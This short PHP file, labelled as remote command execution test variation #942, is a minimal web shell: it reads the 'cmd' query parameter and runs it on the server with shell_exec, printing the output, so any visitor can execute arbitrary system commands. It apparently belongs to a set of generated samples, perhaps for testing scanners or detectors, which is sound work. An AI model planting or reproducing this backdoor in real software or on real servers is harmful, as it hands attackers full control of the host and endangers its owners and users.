<?php
// RCE test variation #942
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>